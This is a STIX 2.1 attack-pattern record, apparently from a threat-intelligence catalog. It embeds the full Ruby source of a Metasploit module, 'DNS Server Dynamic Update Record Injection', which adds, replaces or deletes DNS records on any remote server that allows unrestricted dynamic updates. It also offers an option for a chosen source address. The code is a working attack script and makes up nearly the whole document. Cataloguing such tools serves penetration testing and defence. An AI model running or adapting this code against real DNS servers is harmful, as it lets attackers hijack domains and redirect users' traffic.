{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e40149ac-f35d-46cc-a577-41c200cd6d8d",
    "created": "2024-08-14T16:22:21.244153Z",
    "modified": "2024-08-14T16:22:21.244158Z",
    "name": "DNS Server Dynamic Update Record Injection",
    "description": " This module allows adding and/or deleting a record to any remote DNS server that allows unrestricted dynamic updates.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/dns/dyn_dns_update.rb",
            "external_id": "dyn_dns_update.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.tenable.com/plugins/nessus/35372"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/KINGSABRI/CVE-in-Ruby/tree/master/NONE-CVE/DNSInject"
        },
        {
            "source_name": "reference",
            "url": "https://www.christophertruncer.com/dns-modification-dnsinject-nessus-plugin-35372/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/ChrisTruncer/PenTestScripts/blob/master/HostScripts/DNSInject.py"
        }
    ],
    "x_code_snippet": "# -*- coding: binary -*-\n##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'dnsruby'\n\nclass MetasploitModule < Msf::Auxiliary\n\n  def initialize\n    super(\n        'Name'           => 'DNS Server Dynamic Update Record Injection',\n        'Description'    => %q{\n        This module allows adding and/or deleting a record to\n        any remote DNS server that allows unrestricted dynamic updates.},\n        'Author'         => [\n          'King Sabri <king.sabri[at]gmail.com>',\n          'Brent Cook <brent_cook[at]rapid7.com>'\n        ],\n        'References'     => [\n          ['URL', 'https://www.tenable.com/plugins/nessus/35372'],\n          ['URL', 'https://github.com/KINGSABRI/CVE-in-Ruby/tree/master/NONE-CVE/DNSInject'],\n          ['URL', 'https://www.christophertruncer.com/dns-modification-dnsinject-nessus-plugin-35372/'],\n          ['URL', 'https://github.com/ChrisTruncer/PenTestScripts/blob/master/HostScripts/DNSInject.py']\n        ],\n        'License'        => MSF_LICENSE,\n        'Actions'        => [\n          ['UPDATE', 'Description' => 'Add or update a record. (default)'],\n          ['ADD',    'Description' => 'Add a new record. Fail if it already exists.'],\n          ['DELETE', 'Description' => 'Delete an existing record.']\n        ],\n        'DefaultAction' => 'UPDATE'\n    )\n\n    register_options([\n      OptString.new('DOMAIN', [true, 'The domain name']),\n      OptAddress.new('RHOST', [true, 'The vulnerable DNS server IP address']),\n      OptString.new('HOSTNAME', [true, 'The name record you want to add']),\n      OptAddress.new('IP', [false, 'The IP you want to assign to the record']),\n      OptString.new('VALUE', [false, 'The string to be added with TXT or CNAME record']),\n      OptEnum.new('TYPE',  [true, 'The record type you want to add.', 'A', ['A', 'AAAA', 'CNAME', 'TXT']]),\n      OptAddress.new('CHOST', [false, 'The source address to use for queries and updates'])\n    ])\n\n  end\n\n  def record_action(type, type_enum, value, action)\n    # Send the update to the zone's primary master.\n    domain = datastore['DOMAIN']\n    fqdn   = \"#{datastore['HOSTNAME']}.#{domain}\"\n    opts   = {nameserver: datastore['RHOST']}\n    if datastore['CHOST'] && datastore['CHOST'] != \"\"\n      if Rex::Socket.is_ipv4?(datastore['CHOST'])\n        opts[:src_address] = datastore['CHOST']\n      elsif Rex::Socket.is_ipv6?(datastore['CHOST'])\n        opts[:src_address6] = datastore['CHOST']\n      end\n    end\n    resolver = Dnsruby::Resolver.new(opts)\n    update   = Dnsruby::Update.new(domain)\n    updated  = false\n    case\n      when action == :resolve\n        begin\n          answer = resolver.query(fqdn, type)\n          if (answer.answer.count > 0) then\n            print_good \"Found existing #{type} record for #{fqdn}\"\n            return true\n          end\n          return false\n        rescue Dnsruby::ResolvError, IOError => e\n          print_good \"Did not find an existing #{type} record for #{fqdn}\"\n          vprint_error \"Query failed: #{e.message}\"\n          return false\n        end\n      when action == :add\n        print_status(\"Sending dynamic DNS add message...\")\n        update.absent(\"#{fqdn}.\", type)\n        update.add(\"#{fqdn}.\", type_enum, 86400, value)\n        begin\n          resolver.send_message(update)\n          print_good \"The record '#{fqdn} => #{value}' has been added!\"\n          updated = true\n        rescue Dnsruby::ResolvError, IOError => e\n          print_error \"Cannot add #{fqdn}\"\n          vprint_error \"The DNS server may not be vulnerable, or there may be a preexisting static record.\"\n          vprint_error \"Update failed: #{e.message}\"\n        end\n      when action == :delete\n        begin\n          print_status(\"Sending dynamic DNS delete message...\")\n          update.present(fqdn, type)\n          update.delete(fqdn, type)\n          resolver.send_message(update)\n          print_good(\"The record '#{fqdn} => #{value}' has been deleted!\")\n          updated = true\n        rescue Dnsruby::ResolvError, IOError => e\n          print_error \"Cannot delete #{fqdn}\"\n          vprint_error \"The DNS server may not be vulnerable, or there may be a preexisting static record.\"\n          vprint_error \"Update failed: #{e.message}\"\n        end\n    end\n    updated\n  end\n\n  def update_record(type:, type_enum:, value:, value_name:)\n    if value.nil? || value == \"\"\n      print_error \"Record type #{type} requires the #{value_name} parameter to be specified\"\n      return\n    end\n    force = datastore['CHOST'] && datastore['CHOST'] != \"\"\n    case\n      when action.name == 'UPDATE'\n        if force\n          record_action(type, type_enum, value, :delete)\n          record_action(type, type_enum, value, :add)\n        else\n          if record_action(type, type_enum, value, :resolve)\n            if record_action(type, type_enum, value, :delete)\n              record_action(type, type_enum, value, :add)\n            end\n          else\n            record_action(type, type_enum, value, :add)\n          end\n        end\n      when action.name == 'ADD'\n        if force\n          record_action(type, type_enum, value, :add)\n        else\n          if record_action(type, type_enum, value, :resolve) == false\n            record_action(type, type_enum, value, :add)\n          else\n            print_error \"Record already exists, try DELETE or UPDATE\"\n          end\n        end\n      when action.name == 'DELETE'\n        if force\n          record_action(type, type_enum, value, :delete)\n        else\n          if record_action(type, type_enum, value, :resolve)\n            record_action(type, type_enum, value, :delete)\n          else\n            print_error \"Record does not exist, not deleting\"\n          end\n        end\n    end\n  end\n\n  def run\n    ip = datastore['IP']\n    value = datastore['VALUE']\n    begin\n      case\n      when datastore['TYPE'] == 'A'\n        update_record(type: 'A', type_enum: Dnsruby::Types.A, value: ip, value_name: 'IP')\n      when datastore['TYPE'] == 'AAAA'\n        update_record(type: 'AAAA', type_enum: Dnsruby::Types.AAAA, value: ip, value_name: 'IP')\n      when datastore['TYPE'] == 'CNAME'\n        update_record(type: 'CNAME', type_enum: Dnsruby::Types.CNAME, value: value, value_name: 'VALUE')\n      when datastore['TYPE'] == 'TXT'\n        update_record(type: 'TXT', type_enum: Dnsruby::Types.TXT, value: value, value_name: 'VALUE')\n      else\n        print_error \"Invalid Record Type!\"\n      end\n    rescue ArgumentError => e\n      print_error(e.message)\n    rescue Dnsruby::OtherResolvError\n      print_error(\"Connection Refused!\")\n    rescue Dnsruby::DecodeError\n      print_error(\"Invalid DNS reply, ensure you are connecting to a DNS server\")\n    end\n  end\nend\n"
}